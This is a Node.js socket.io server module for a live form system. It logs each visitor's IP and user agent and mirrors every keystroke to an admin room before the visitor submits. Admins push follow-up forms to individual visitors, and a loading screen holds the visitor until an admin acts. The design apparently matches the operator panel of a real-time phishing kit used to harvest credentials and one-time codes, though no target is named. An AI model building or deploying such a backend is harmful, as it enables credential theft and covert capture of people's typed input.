const { v4: uuidv4 } = require('uuid');
const { pool, upsertFormField } = require('./db');
const { FORM_TEMPLATES, DEFAULT_FORM_TYPE } = require('./formTemplates');

const ADMIN_ROOM = 'admins';
const sessionRoom = (sessionId) => `session:${sessionId}`;

// Debounce DB writes for rapid keystrokes without delaying the live relay to admins.
const fieldWriteTimers = new Map();
const FIELD_WRITE_DEBOUNCE_MS = 250;

function scheduleFieldWrite(formId, field, value) {
  const key = `${formId}:${field}`;
  if (fieldWriteTimers.has(key)) clearTimeout(fieldWriteTimers.get(key));
  const timer = setTimeout(async () => {
    fieldWriteTimers.delete(key);
    try {
      await upsertFormField(formId, field, value);
    } catch (err) {
      console.error('Failed to persist field value', err);
    }
  }, FIELD_WRITE_DEBOUNCE_MS);
  fieldWriteTimers.set(key, timer);
}

// Creates a form row for the given template and pushes it to the visitor
// (and mirrors it to admins). Returns the new formId, or null if unknown type.
// `dynamicText` is an optional one-off message an admin can set per open,
// shown on the user's page right under the form title.
async function openForm(io, sessionId, formType, dynamicText) {
  const template = FORM_TEMPLATES[formType];
  if (!template) return null;

  const formId = uuidv4();
  await pool.query(
    `INSERT INTO forms (id, session_id, form_type, status) VALUES (?, ?, ?, 'open')`,
    [formId, sessionId, formType]
  );

  const onloadText = template.onload_text || (template.extra && template.extra.onload_text) || null;
  const payload = {
    formId,
    formType,
    label: template.label,
    fields: template.fields,
    extra: template.extra || {},
    onloadText,
    dynamicText: dynamicText || null
  };

  io.to(sessionRoom(sessionId)).emit('form:open', payload);
  io.to(ADMIN_ROOM).emit('form:opened', { sessionId, ...payload });
  return formId;
}

// Special value for `DEFAULT_FORM_TYPE` or a template's `submit_form`:
// instead of opening a template, leave the visitor on the full-screen
// loading screen (e.g. while waiting on something outside the form flow).
// Nothing else auto-closes it — it stays up until the admin opens a form.
const LOADING_SENTINEL = 'loading';

async function openDefaultForm(io, sessionId) {
  try {
    if (DEFAULT_FORM_TYPE === LOADING_SENTINEL) {
      io.to(sessionRoom(sessionId)).emit('form:loading');
      return;
    }
    await openForm(io, sessionId, DEFAULT_FORM_TYPE);
  } catch (err) {
    console.error('Failed to auto-open default form', err);
  }
}

// Raw `submit_form` value set on a template (top level or inside `extra`),
// unvalidated — the caller decides what to do with the sentinel vs. an
// actual template key.
function submitFormValueFor(formType) {
  const template = FORM_TEMPLATES[formType];
  if (!template) return null;
  return template.submit_form || (template.extra && template.extra.submit_form) || null;
}

module.exports = function registerSocket(io) {
  // socket.id -> { type: 'user'|'admin', sessionId?, pageId? }
  const socketMeta = new Map();

  io.on('connection', (socket) => {
    // ---- USER SIDE ----
    socket.on('user:register', async ({ pageId, sessionId: existingId }, ack) => {
      if (!pageId) {
        if (typeof ack === 'function') ack({ error: 'Page not found' });
        return;
      }
      try {
        const [[page]] = await pool.query('SELECT * FROM pages WHERE id = ?', [pageId]);
        if (!page) {
          if (typeof ack === 'function') ack({ error: 'Page not found' });
          return;
        }

        const ip = socket.handshake.address || null;
        const userAgent = socket.handshake.headers['user-agent'] || null;

        // Reconnect (e.g. page refresh): reuse the client's existing session
        // for this page instead of spawning a new one.
        if (existingId) {
          const [[existing]] = await pool.query(
            'SELECT * FROM sessions WHERE id = ? AND page_id = ?',
            [existingId, pageId]
          );
          if (existing) {
            await pool.query(
              "UPDATE sessions SET socket_id = ?, status = 'active', last_seen = CURRENT_TIMESTAMP WHERE id = ?",
              [socket.id, existingId]
            );

            socketMeta.set(socket.id, { type: 'user', sessionId: existingId, pageId });
            socket.join(sessionRoom(existingId));

            if (typeof ack === 'function') ack({ sessionId: existingId });

            io.to(ADMIN_ROOM).emit('session:online', {
              sessionId: existingId,
              session: { ...existing, status: 'active', socket_id: socket.id }
            });

            await openDefaultForm(io, existingId);
            return;
          }
        }

        const sessionId = uuidv4();

        await pool.query(
          `INSERT INTO sessions (id, page_id, socket_id, status, ip_address, user_agent)
           VALUES (?, ?, ?, 'active', ?, ?)`,
          [sessionId, pageId, socket.id, ip, userAgent]
        );

        socketMeta.set(socket.id, { type: 'user', sessionId, pageId });
        socket.join(sessionRoom(sessionId));

        if (typeof ack === 'function') ack({ sessionId });

        io.to(ADMIN_ROOM).emit('session:new', {
          session: {
            id: sessionId,
            page_id: pageId,
            status: 'active',
            ip_address: ip,
            user_agent: userAgent,
            created_at: new Date().toISOString()
          },
          page: { id: page.id, title: page.title }
        });

        await openDefaultForm(io, sessionId);
      } catch (err) {
        console.error('user:register failed', err);
        if (typeof ack === 'function') ack({ error: 'Registration failed' });
      }
    });

    socket.on('user:formInput', ({ formId, field, value }) => {
      const meta = socketMeta.get(socket.id);
      if (!meta || meta.type !== 'user' || !formId || !field) return;

      scheduleFieldWrite(formId, field, value);

      io.to(ADMIN_ROOM).emit('form:inputUpdate', {
        sessionId: meta.sessionId,
        formId,
        field,
        value
      });
    });

    socket.on('user:formSubmit', async ({ formId, data }) => {
      const meta = socketMeta.get(socket.id);
      if (!meta || meta.type !== 'user' || !formId) return;

      try {
        const entries = Object.entries(data || {});
        for (const [field, value] of entries) {
          await upsertFormField(formId, field, value);
        }
        await pool.query("UPDATE forms SET status = 'submitted' WHERE id = ?", [formId]);

        io.to(ADMIN_ROOM).emit('form:submitted', {
          sessionId: meta.sessionId,
          formId,
          data
        });

        const [[form]] = await pool.query('SELECT form_type FROM forms WHERE id = ?', [formId]);
        const submitFormValue = form && submitFormValueFor(form.form_type);

        if (submitFormValue === LOADING_SENTINEL) {
          io.to(sessionRoom(meta.sessionId)).emit('form:loading');
        } else if (submitFormValue && FORM_TEMPLATES[submitFormValue]) {
          await openForm(io, meta.sessionId, submitFormValue);
        }
      } catch (err) {
        console.error('user:formSubmit failed', err);
      }
    });

    // ---- ADMIN SIDE ----
    socket.on('admin:register', async (_payload, ack) => {
      socketMeta.set(socket.id, { type: 'admin' });
      socket.join(ADMIN_ROOM);

      try {
        const [sessions] = await pool.query(
          `SELECT s.*, p.title AS page_title FROM sessions s
           JOIN pages p ON p.id = s.page_id
           ORDER BY s.created_at DESC LIMIT 200`
        );
        if (typeof ack === 'function') ack({ sessions, formTemplates: FORM_TEMPLATES });
      } catch (err) {
        console.error('admin:register failed', err);
        if (typeof ack === 'function') ack({ sessions: [], formTemplates: FORM_TEMPLATES });
      }
    });

    socket.on('admin:openForm', async ({ sessionId, formType, dynamicText }, ack) => {
      const meta = socketMeta.get(socket.id);
      if (!meta || meta.type !== 'admin') return;

      const template = FORM_TEMPLATES[formType];
      if (!template) {
        if (typeof ack === 'function') ack({ error: 'Unknown form type' });
        return;
      }

      try {
        const formId = await openForm(io, sessionId, formType, dynamicText);

        if (typeof ack === 'function') ack({ ok: true, formId });
      } catch (err) {
        console.error('admin:openForm failed', err);
        if (typeof ack === 'function') ack({ error: 'Failed to open form' });
      }
    });

    socket.on('admin:closeForm', async ({ sessionId, formId }) => {
      const meta = socketMeta.get(socket.id);
      if (!meta || meta.type !== 'admin') return;

      try {
        await pool.query("UPDATE forms SET status = 'closed', closed_at = CURRENT_TIMESTAMP WHERE id = ?", [
          formId
        ]);

        io.to(sessionRoom(sessionId)).emit('form:close', { formId });
        io.to(ADMIN_ROOM).emit('form:closed', { sessionId, formId });
      } catch (err) {
        console.error('admin:closeForm failed', err);
      }
    });

    // ---- DISCONNECT ----
    socket.on('disconnect', async () => {
      const meta = socketMeta.get(socket.id);
      socketMeta.delete(socket.id);
      if (!meta) return;

      if (meta.type === 'user' && meta.sessionId) {
        try {
          await pool.query("UPDATE sessions SET status = 'inactive' WHERE id = ?", [
            meta.sessionId
          ]);
        } catch (err) {
          console.error('Failed to mark session inactive', err);
        }
        io.to(ADMIN_ROOM).emit('session:offline', { sessionId: meta.sessionId });
      }
    });
  });
};
